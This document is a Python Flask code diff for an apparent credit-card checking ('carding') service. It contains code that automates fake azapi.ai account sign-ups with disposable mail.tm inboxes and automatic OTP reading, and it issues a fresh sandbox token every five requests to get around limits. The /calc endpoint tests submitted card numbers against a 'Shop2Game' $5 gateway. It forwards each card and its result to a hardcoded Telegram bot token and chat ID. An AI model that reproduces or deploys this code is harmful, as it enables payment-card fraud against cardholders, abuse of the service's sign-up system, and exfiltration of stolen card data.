@@ -1,9 +1,414 @@
 import requests,json,base64
 import uuid
 import time
-import hashlib,random,time
+import hashlib,random
 import user_agent
 from flask import Flask, request, jsonify
+import urllib.parse
+from collections import deque
+import string
+import re
+from bs4 import BeautifulSoup
+
+BASE = "https://api.mail.tm"
+
+
+# -----------------------
+# توليد اسم عشوائي
+# -----------------------
+def random_string(n=10):
+    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
+
+
+# -----------------------
+# جلب الدومين
+# -----------------------
+def get_domain():
+    r = requests.get(f"{BASE}/domains")
+    return r.json()["hydra:member"][0]["domain"]
+
+
+# -----------------------
+# إنشاء حساب
+# -----------------------
+def create_account(email, password):
+    r = requests.post(f"{BASE}/accounts", json={
+        "address": email,
+        "password": password
+    })
+    
+# -----------------------
+# تسجيل دخول
+# -----------------------
+def get_token(email, password):
+    r = requests.post(f"{BASE}/token", json={
+        "address": email,
+        "password": password
+    })
+
+    
+    if r.status_code == 200:
+        return r.json()["token"]
+    return None
+
+
+# -----------------------
+# Headers
+# -----------------------
+def auth_headers(token):
+    return {"Authorization": f"Bearer {token}"}
+
+
+# -----------------------
+# جلب الرسائل
+# -----------------------
+def get_messages(token):
+    r = requests.get(f"{BASE}/messages", headers=auth_headers(token))
+    return r.json()["hydra:member"]
+
+
+# -----------------------
+# جلب رسالة كاملة
+# -----------------------
+def get_message(token, msg_id):
+    r = requests.get(f"{BASE}/messages/{msg_id}", headers=auth_headers(token))
+    return r.json()
+
+
+# -----------------------
+# تنظيف HTML
+# -----------------------
+def clean_html(html):
+    if isinstance(html, list):
+        html = "".join(html)
+    if not html:
+        return ""
+    return BeautifulSoup(html, "html.parser").get_text()
+
+
+# -----------------------
+# استخراج OTP (ذكي)
+# -----------------------
+def extract_code(text):
+    if not text:
+        return None
+
+    # يبحث عن OTP Code: XXXX
+    match = re.search(r"OTP\s*Code\s*[:\-]?\s*([A-Za-z0-9]{4,8})", text, re.IGNORECASE)
+
+    if match:
+        return match.group(1)
+
+    return None
+
+
+# -----------------------
+# مراقبة البريد
+# -----------------------
+def watch_inbox(em,token, delay=5):
+    seen = set()
+
+    
+    while True:
+        messages = get_messages(token)
+
+        for msg in messages:
+            if msg["id"] in seen:
+                continue
+
+            seen.add(msg["id"])
+
+            full = get_message(token, msg["id"])
+
+            sender = full.get("from", {}).get("address")
+            subject = full.get("subject")
+
+            html = full.get("html") or ""
+            text = full.get("text") or ""
+
+            # حل مشكلة list
+            if isinstance(html, list):
+                html = "".join(html)
+            if isinstance(text, list):
+                text = "".join(text)
+
+            clean_text = clean_html(html) + "\n" + text
+
+            
+
+            code = extract_code(clean_text)
+
+            if code:
+                
+                ok=votp(em,code)
+                if ok:
+                	ok1=(vpas(em))
+                	return
+                	
+                
+            else:
+                pass
+
+            
+        time.sleep(delay)
+
+
+
+def watch_inboxlogin(email,token, delay=5):
+    seen = set()
+
+    
+    while True:
+        messages = get_messages(token)
+
+        for msg in messages:
+            if msg["id"] in seen:
+                continue
+
+            seen.add(msg["id"])
+
+            full = get_message(token, msg["id"])
+
+            sender = full.get("from", {}).get("address")
+            subject = full.get("subject")
+
+            html = full.get("html") or ""
+            text = full.get("text") or ""
+
+            # حل مشكلة list
+            if isinstance(html, list):
+                html = "".join(html)
+            if isinstance(text, list):
+                text = "".join(text)
+
+            clean_text = clean_html(html) + "\n" + text
+
+            
+
+            code = extract_code(clean_text)
+
+            if code:
+                return vlog(email,code)
+                
+                
+            else:
+                pass
+
+            
+        time.sleep(delay)
+
+
+def otp(em):
+	url = "https://app.azapi.ai/api/register"
+	
+	payload = {
+	  "email": em,
+	  "referral": ""
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json, text/plain, */*",
+	  'Content-Type': "application/json",
+	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'Origin': "https://app.azapi.ai",
+	  'Sec-Fetch-Site': "same-origin",
+	  'Sec-Fetch-Mode': "cors",
+	  'Sec-Fetch-Dest': "empty",
+	  'Referer': "https://app.azapi.ai/signup",
+	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
+	  
+	}
+	
+	response = requests.post(url, data=json.dumps(payload), headers=headers)
+	if response.status_code == 200:
+		return True
+	else:
+		False
+
+def votp(em,code):
+	url = "https://app.azapi.ai/api/verify-otp"
+	
+	payload = {
+	  "otp": code,
+	  "email": em
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json, text/plain, */*",
+	  'Content-Type': "application/json",
+	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'Origin': "https://app.azapi.ai",
+	  'Sec-Fetch-Site': "same-origin",
+	  'Sec-Fetch-Mode': "cors",
+	  'Sec-Fetch-Dest': "empty",
+	  'Referer': "https://app.azapi.ai/signup",
+	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
+	  
+	}
+	
+	response = requests.post(url, data=json.dumps(payload), headers=headers)
+	
+	if response.status_code == 200:
+		return True
+	else:
+		False
+
+def login(email):
+	url = "https://app.azapi.ai/api/login"
+	
+	payload = {
+	  "email": email,
+	  "password": "AnA##AnA1"
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json, text/plain, */*",
+	  'Content-Type': "application/json",
+	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'Origin': "https://app.azapi.ai",
+	  'Sec-Fetch-Site': "same-origin",
+	  'Sec-Fetch-Mode': "cors",
+	  'Sec-Fetch-Dest': "empty",
+	  'Referer': "https://app.azapi.ai/",
+	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
+	  
+	}
+	
+	response = requests.post(url, data=json.dumps(payload), headers=headers)
+	
+	
+def vpas(em):	
+	url = "https://app.azapi.ai/api/set-password"
+	
+	payload = {
+	  "email": em,
+	  "password": "AnA##AnA1",
+	  "confirm_password": "AnA##AnA1"
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json, text/plain, */*",
+	  'Content-Type': "application/json",
+	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'Origin': "https://app.azapi.ai",
+	  'Sec-Fetch-Site': "same-origin",
+	  'Sec-Fetch-Mode': "cors",
+	  'Sec-Fetch-Dest': "empty",
+	  'Referer': "https://app.azapi.ai/signup",
+	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
+	}
+	
+	response = requests.post(url, data=json.dumps(payload), headers=headers)
+	
+	if response.status_code == 200:
+		return True
+	else:
+		False
+
+def vlog(email,code):
+	url = "https://app.azapi.ai/api/verify-login-otp"
+	
+	payload = {
+	  "otp": code,
+	  "email": email
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json, text/plain, */*",
+	  'Content-Type': "application/json",
+	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'Origin': "https://app.azapi.ai",
+	  'Sec-Fetch-Site': "same-origin",
+	  'Sec-Fetch-Mode': "cors",
+	  'Sec-Fetch-Dest': "empty",
+	  'Referer': "https://app.azapi.ai/",
+	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
+	  
+	}
+	
+	response = requests.post(url, data=json.dumps(payload), headers=headers)
+	
+	token=(response.json()['data']['token'])
+	sandbox_token=(response.json()['data']['sandbox_token'])
+	return token,sandbox_token
+
+def final(token,email):
+	url = "https://app.azapi.ai/api/client"
+	
+	payload = {
+	  "first_name": "michal",
+	  "last_name": "aguro",
+	  "email": email,
+	  "secondary_email": email,
+	  "mobile_no": "12015589645",
+	  "company_name": None,
+	  "address": "new york city 0099",
+	  "country_id": 1,
+	  "country_code": "+93",
+	  "state": "new york",
+	  "city": "new york",
+	  "postal_code": "10090",
+	  "tax_number": None,
+	  "profile_type": 0
+	}
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json, text/plain, */*",
+	  'Content-Type': "application/json",
+	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'Authorization': token,
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'Origin': "https://app.azapi.ai",
+	  'Sec-Fetch-Site': "same-origin",
+	  'Sec-Fetch-Mode': "cors",
+	  'Sec-Fetch-Dest': "empty",
+	  'Referer': "https://app.azapi.ai/profile",
+	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
+	  
+	}
+	
+	response = requests.put(url, data=json.dumps(payload), headers=headers)
+def generate_token():
+    domain = get_domain()
+    email = f"{random_string()}@{domain}"
+    password = "Test12345"
+    otp(email)
+    
+    create_account(email, password)
+
+    token = get_token(email, password)
+
+    if token:
+        watch_inbox(email,token)
+        login(email)
+        time.sleep(2)
+        okk=watch_inboxlogin(email,token)
+        final(okk[0],email)
+        return okk[1]
+    else:
+        return "❌ Failed to get token"
+
+
+
+
+
 
 app = Flask(__name__)
 
@@ -638,10 +1043,8 @@ def typecard(cc):
 	return type
 
 
-def run(k):
+def run(k,aut):
 	pu=('3477906171','1666397772','2114383021','2114383021','2828550589','2828550589')
-	aua=('sand-14179121a6a895868bb9652ca0d798b8d33cc8b354132a3dac4de0ac78b1cfb6')
-	aut=random.choices(aua)[0]
 	playeruuid=random.choices(pu)[0]
 	uag=useragent()
 	json_text = json.dumps(data, separators=(",", ":"))
@@ -663,27 +1066,81 @@ def run(k):
 	return re
 
 
+
+
+TOKEN_LIMIT = 5
+
+
+# -----------------------
+# حالة داخل الذاكرة
+# -----------------------
+state = {
+    "token": None,
+    "requests": deque(maxlen=TOKEN_LIMIT)
+}
+
+
+
+
+# -----------------------
+# init token
+# -----------------------
+if not state["token"]:
+    state["token"] = generate_token()
+
+
+
+# -----------------------
+# /calc endpoint
+# -----------------------
 @app.route("/calc", methods=["GET"])
 def calc():
-	a = request.args.get("cc")
-	if "|" in a:
-		pass
-	else:
-		return jsonify({
-           'amount': '5$',
-            "gateway": 'Shop2Game',
-            "result": 'Not Fund Card ❌'
-        })
-	try:
-		result=run(a)
-	except:
-		result='Proxy Bad ❌'
-	requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={a}|{result}|shop2game ')
-	return jsonify({
-           'card': a,
-           'amount': '5$',
-            "gateway": 'Shop2Game',
-            "result": result
-        })
+    a = request.args.get("cc")
+
+    if not a:
+        return jsonify({"error": "missing cc"}), 400
+
+    # -----------------------
+    # request id
+    # -----------------------
+    req_id = str(uuid.uuid4())
+    state["requests"].append(req_id)
+    if len(state["requests"]) >= TOKEN_LIMIT:
+        state["token"] = generate_token()
+        state["requests"].clear()
+
+    try:
+        result = run(a,state["token"])
+    except Exception as e:
+        result = "Proxy Bad ❌"
+
+    # -----------------------
+    # Telegram log
+    # -----------------------
+    try:
+        text = f"{req_id}|{a}|{result}"
+        encoded = urllib.parse.quote(text)
+
+        requests.get(
+            f"https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage"
+            f"?chat_id=6689099522&text={encoded}"
+        )
+    except Exception as e:
+        print("Telegram error:", e)
+
+    # -----------------------
+    # response
+    # -----------------------
+    return jsonify({
+        "request_id": req_id,
+        "card": a,
+        "amount": "5$",
+        "gateway": "Shop2Game",
+        "result": result,
+        "token_used": state["token"]
+    })
+
+
+
 def handler(environ, start_response):
-    return app(environ, start_response)       
+    return app(environ, start_response)
